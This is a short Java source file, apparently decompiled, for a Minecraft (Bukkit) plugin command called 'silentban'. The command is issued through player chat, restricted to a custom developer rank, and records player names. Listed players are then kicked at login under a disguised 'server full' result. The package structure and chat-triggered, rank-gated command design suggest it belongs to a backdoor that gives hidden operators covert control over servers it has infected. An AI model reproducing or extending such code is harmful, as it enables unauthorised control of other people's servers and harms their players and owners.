package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import java.util.Arrays;
import java.util.HashMap;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.player.PlayerLoginEvent.Result;

@CommandInfo(
   name = "silentban",
   description = "Silently temporarily bans a player",
   blatant = true,
   rank = Rank.DEVELOPER
)
public class SilentBanCommand extends AbstractCommand implements Listener {
   public HashMap<String, String> bans = new HashMap<>();

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      String var4 = String.join(" ", Arrays.stream(var3).skip(1L).toArray(String[]::new)).replace("&", "§");
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please use silentban <player> (optional : reason)");
      } else {
         this.bans.put(var3[0], var4);
         ChatUtil.sendChat(var1.getPlayer(), "Successfully banned " + var3[0]);
      }
   }

   @EventHandler
   public void onJoin(PlayerLoginEvent var1) {
      if (this.bans.containsKey(var1.getPlayer().getName())) {
         var1.setKickMessage(this.bans.get(var1.getPlayer().getName()));
         var1.setResult(Result.KICK_FULL);
      }
   }
}
